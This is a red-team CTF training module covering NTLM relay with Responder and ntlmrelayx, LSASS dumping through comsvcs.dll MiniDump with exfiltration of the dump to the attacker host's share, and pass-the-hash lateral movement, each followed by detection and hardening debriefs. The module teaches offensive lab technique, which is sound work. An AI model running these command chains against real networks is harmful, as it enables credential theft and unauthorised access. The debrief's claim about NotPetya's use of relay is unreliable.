---
title: "Red Team CTF Sprint — Day 4: Credential Access and Lateral Movement"
tags: [red-team, CTF, NTLM-relay, SMB-relay, ntlmrelayx, Responder, PTH,
  lateral-movement, LSASS, comsvcs, credential-access, T1557.001, T1550.002,
  T1003.001, sprint, advanced, challenge]
module: 08-RedTeam-03
day: 554
related_topics:
  - Red Team CTF Sprint Day 3 (Day 553)
  - Offshore Lab Episode 2 (Day 536)
  - Advanced LOLAD (Day 546)
  - Red Team CTF Sprint Day 5 (Day 555)
---

# Day 554 — Red Team CTF Sprint: Day 4

> "Credentials are the currency. How you get them — relay, dump, spray, or
> steal — matters less than what you do with them once you have them.
> Every lateral movement technique is a credential plus a transport. Know
> both halves."
>
> — Ghost

---

## Goals

Execute an NTLM relay attack in a constrained lab environment where SMB
signing is disabled on targets.
Dump LSASS credentials using comsvcs.dll MiniDump (no Mimikatz on disk).
Use recovered credentials for lateral movement via Pass-the-Hash.
Chain credential access → lateral movement → flag retrieval end-to-end.

**Prerequisites:** Day 536 (Offshore Ep2, Responder + ntlmrelayx), Day 546
(comsvcs.dll MiniDump). Impacket suite must be installed.
**Time budget:** 4 hours (2 hours per challenge).

---

## Challenge 1 — Catch and Relay

### Category
Network / Credential Access

### Difficulty
Advanced
Estimated time: 90 minutes for a student at target level

### Learning Objective
Configure Responder and ntlmrelayx to capture an NTLM authentication
attempt from a misconfigured host and relay it to a target where SMB
signing is disabled — obtaining a shell or authenticated access without
cracking a single hash.

### Scenario

```
You are on the corp.local internal network via VPN (from Day 548 scenario).
Your attack host is at 10.10.10.200 (reachable from all lab hosts).

Environment:
  DC01            (10.10.10.5)   — SMB signing ENABLED (do not target)
  FILE-SERVER-01  (10.10.10.30)  — SMB signing DISABLED ← relay target
  WORKSTATION-03  (10.10.10.45)  — sends periodic UNC path requests
                                   (simulated misconfigured scheduled task
                                    that references \\FILESHARE\scripts\)

The flag is at \\FILE-SERVER-01\AdminShare\flag.txt
(accessible only by administrators)

Your position: jdoe credential (standard domain user — no admin on FILE-SERVER-01)

Mission: capture the authentication from WORKSTATION-03's scheduled task
and relay it to FILE-SERVER-01 to access AdminShare as an admin.
```

### Vulnerability / Technique
T1557.001 — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay
CWE-290 — Authentication Bypass by Spoofing

### Hint Progression
1. Responder must have SMB and HTTP disabled — if Responder answers SMB
   requests, ntlmrelayx cannot relay them. Edit `/etc/responder/Responder.conf`.
2. ntlmrelayx needs the list of relay targets (hosts with SMB signing off).
   Use `crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt`.
3. ntlmrelayx's `-socks` flag keeps the relay session alive as a SOCKS proxy
   rather than executing a single command — more flexible for interactive access.

### Solution Walkthrough

```bash
# STEP 1: Identify SMB signing status across the subnet
proxychains crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
# relay_targets.txt will contain: 10.10.10.30 (FILE-SERVER-01)
# DC01 is not in the list because signing is REQUIRED there

# STEP 2: Disable SMB and HTTP in Responder config (critical)
sudo sed -i 's/SMB = On/SMB = Off/' /etc/responder/Responder.conf
sudo sed -i 's/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# STEP 3: Start ntlmrelayx pointing at relay targets
sudo proxychains impacket-ntlmrelayx \
    -tf relay_targets.txt \
    -smb2support \
    -socks

# STEP 4: Start Responder (poisoner) — different terminal
sudo responder -I eth0 -wPv

# WAIT: WORKSTATION-03's scheduled task fires → tries to connect to
#       \\FILESHARE\scripts\ → LLMNR query → Responder poisons → auth
#       captured by ntlmrelayx → relayed to FILE-SERVER-01

# Output from ntlmrelayx:
# [*] SMBD-Thread-4: Received connection from 10.10.10.45
# [*] Authenticating against smb://10.10.10.30 as CORP/WKS03$ SUCCEED
# [*] Adding SOCKS tunnel for smb://CORP/WKS03$@10.10.10.30

# STEP 5: Use the SOCKS tunnel to access FILE-SERVER-01 as the relayed identity
# ntlmrelayx opens a SOCKS proxy on 127.0.0.1:1080 by default
# Configure proxychains to use it:
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf

proxychains smbclient //10.10.10.30/AdminShare
# No password needed — session is already authenticated via relay
smb: \> get flag.txt
# FLAG: CTF{relay_no_crack_required}
```

### Flag
`CTF{relay_no_crack_required}`

### Debrief Points

```
1. NTLM relay requires: (a) an NTLM authentication attempt you can
   intercept/poison, and (b) a target with SMB signing disabled.
   Fix (b) first: `Set-SmbServerConfiguration -RequireSecuritySignature $true`
   on all hosts eliminates the relay target surface entirely.

2. The relay attack requires ZERO password cracking. The authentication
   credential is used once, live, against the target. This means even a
   very strong password offers no protection against relay.

3. Detection:
   → Sysmon Event ID 3: network connection to port 445 from an unexpected
     source (the attacker's Responder host)
   → Event ID 4624 Type 3 logon on FILE-SERVER-01 from WORKSTATION-03's
     machine account — at an unusual time or frequency

4. Fix (a) — stop the poisoning surface: disable LLMNR and NBT-NS via GPO.
   Computer Configuration → Administrative Templates → DNS Client →
   Turn Off Multicast Name Resolution = Enabled.

5. Real-world case: NTLM relay has been an active exploitation technique
   since at least 2001 and remains viable in 2024 in environments that
   have not enforced SMB signing domain-wide. It was used extensively
   in the NotPetya propagation (2017) variant mechanisms.
```

---

## Challenge 2 — The Invisible Dump

### Category
Active Directory / Credential Access / Lateral Movement

### Difficulty
Advanced
Estimated time: 90 minutes for a student at target level

### Learning Objective
Dump LSASS credentials from a compromised host using the comsvcs.dll
MiniDump technique (no Mimikatz binary on disk), process the dump locally,
and use the recovered NT hash for Pass-the-Hash lateral movement to a
second host.

### Scenario

```
You have a WinRM session on WORKSTATION-04 (10.10.10.60) as a local
administrator (credentials from Challenge 1 or given as: localadmin /
LocalAdmin2024!).

Environment:
  WORKSTATION-04  (10.10.10.60)  — you have local admin
  FILESVR-02      (10.10.10.70)  — SMB target — flag at C:\Flags\flag.txt
  
The logged-in user on WORKSTATION-04 is domain user corp\alice.
alice is a member of "Accounting" which has read access to FILESVR-02\Flags.
You do not know alice's password. You must recover her NT hash from LSASS.

Constraint: the lab simulates a basic AV that blocks Mimikatz.exe on disk.
Use comsvcs.dll — a legitimate Windows component — instead.
```

### Vulnerability / Technique
T1003.001 — OS Credential Dumping: LSASS Memory
T1550.002 — Use Alternate Authentication Material: Pass the Hash

### Hint Progression
1. Find alice's process ID with `Get-Process lsass`. The comsvcs.dll
   MiniDump function takes a PID, output path, and "full" as arguments.
2. The dump file is binary. You need to copy it off WORKSTATION-04 to your
   attack host — then run Mimikatz locally (not on the target).
3. `sekurlsa::minidump lsass.dmp` followed by `sekurlsa::logonpasswords`
   in Mimikatz will parse the dump file.

### Solution Walkthrough

```bash
# STEP 1: Connect to WORKSTATION-04 via WinRM
proxychains evil-winrm \
    -i 10.10.10.60 \
    -u localadmin \
    -p 'LocalAdmin2024!'

# STEP 2: Find LSASS PID
*Evil-WinRM* PS> $pid = (Get-Process lsass).Id
*Evil-WinRM* PS> Write-Host "LSASS PID: $pid"
# Output: LSASS PID: 688

# STEP 3: Dump LSASS using comsvcs.dll MiniDump (no Mimikatz on disk)
*Evil-WinRM* PS> rundll32 C:\Windows\System32\comsvcs.dll MiniDump `
    $pid C:\Windows\Temp\lsass.dmp full

# Verify dump was created:
*Evil-WinRM* PS> dir C:\Windows\Temp\lsass.dmp
# Output: file exists, ~50MB+

# STEP 4: Copy the dump to attack host
# Method A: evil-winrm download:
*Evil-WinRM* PS> download C:\Windows\Temp\lsass.dmp /tmp/lsass.dmp

# Method B: via SMB share (if evil-winrm download is slow):
*Evil-WinRM* PS> copy C:\Windows\Temp\lsass.dmp \\10.10.10.200\share\

# STEP 5: Process the dump locally on attack host (Mimikatz locally, not on target)
# Windows VM or Wine:
mimikatz.exe "sekurlsa::minidump /tmp/lsass.dmp" "sekurlsa::logonpasswords" "exit"

# OR on Linux using pypykatz:
pypykatz lsa minidump /tmp/lsass.dmp

# Output includes alice's credentials:
# Username: alice
# Domain: CORP
# NTHash: 5f4dcc3b5aa765d61d8327deb882cf99   (example)
# (wdigest may show plaintext if CredSSP or delegation is active)

# STEP 6: Pass-the-Hash to FILESVR-02 as alice
proxychains crackmapexec smb 10.10.10.70 \
    -u alice \
    -H '5f4dcc3b5aa765d61d8327deb882cf99' \
    --shares

# ACCESS: Flags share listed and accessible

proxychains smbclient //10.10.10.70/Flags \
    -U 'CORP\alice' \
    --pw-nt-hash '5f4dcc3b5aa765d61d8327deb882cf99'

smb: \> get flag.txt
# FLAG: CTF{comsvcs_lsass_no_mimikatz_on_disk}

# CLEANUP: delete the dump file
*Evil-WinRM* PS> del C:\Windows\Temp\lsass.dmp
```

### Flag
`CTF{comsvcs_lsass_no_mimikatz_on_disk}`

### Debrief Points

```
1. comsvcs.dll is a legitimate signed Windows DLL. It is present on every
   Windows installation. No AV flags its use — the dump is identified by
   process access telemetry, not binary signature.

2. Processing the dump locally is the OPSEC improvement over running
   Mimikatz on the target. The dump file on disk is a brief artefact;
   Mimikatz on disk is a permanent indicator.

3. Detection (Sysmon):
   Event ID 10 (ProcessAccess):
     TargetImage: lsass.exe
     GrantedAccess: 0x1010 or 0x1FFFFF (dump-level access masks)
   Event ID 1: rundll32.exe with CommandLine containing "comsvcs" and
     "MiniDump"
   Both fire even when comsvcs.dll is the dumping mechanism.

4. Prevention: enable RunAsPPL (Protected Process Light) for LSASS.
   Registry: HKLM\SYSTEM\CurrentControlSet\Control\Lsa → RunAsPPL = 1.
   With PPL enabled, comsvcs.dll MiniDump requires a kernel driver to bypass
   — significantly raising the bar.

5. pypykatz (Python Mimikatz) is a Linux-native LSASS dump parser. It
   produces the same output as Mimikatz without requiring a Windows system.
   It processes `.dmp` files off-target cleanly.
```

---

## Engagement Log — Day 4 Sprint

```
Time    | Challenge | Action                              | Result
--------|-----------|-------------------------------------|-------
        | C1        | CME relay list generated            |
        | C1        | Responder + ntlmrelayx started      |
        | C1        | Auth captured from WKS03            |
        | C1        | Relay to FILE-SERVER-01 succeeded   |
        | C1        | Flag retrieved via SOCKS relay      |
        | C2        | evil-winrm session established      |
        | C2        | LSASS PID found                     |
        | C2        | comsvcs MiniDump executed           |
        | C2        | Dump downloaded to attack host      |
        | C2        | pypykatz / Mimikatz processed       |
        | C2        | alice NTLM hash recovered           |
        | C2        | CME PTH to FILESVR-02               |
        | C2        | Flag retrieved                      |
        | C2        | Dump file deleted (cleanup)         |

Flags captured: [ ] C1  [ ] C2
Total time: _____ minutes
```

---

## Key Takeaways

1. NTLM relay is a zero-crack technique — password strength is irrelevant.
   The only defences that work are SMB signing enforcement (eliminates relay
   targets) and LLMNR/NBT-NS disablement (eliminates poisoning surface).
2. comsvcs.dll LSASS dumping is the post-Mimikatz standard technique. The
   dump creation is detectable via Sysmon Event ID 10 and Event ID 1, but
   only if those event types are configured and forwarded to a SIEM.
3. Pass-the-Hash using an NT hash from a memory dump is the direct heir to
   the relay attack: both bypass password knowledge entirely. The combination
   of (dump → hash → PTH) is a complete lateral movement chain requiring
   no password cracking at any step.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q554.1, Q554.2 …).

---

## Navigation

← Previous: [Day 553 — Red Team CTF Sprint: Day 3](DAY-0553-Red-Team-CTF-Sprint-Day-3.md)
→ Next: [Day 555 — Red Team CTF Sprint: Day 5](DAY-0555-Red-Team-CTF-Sprint-Day-5.md)
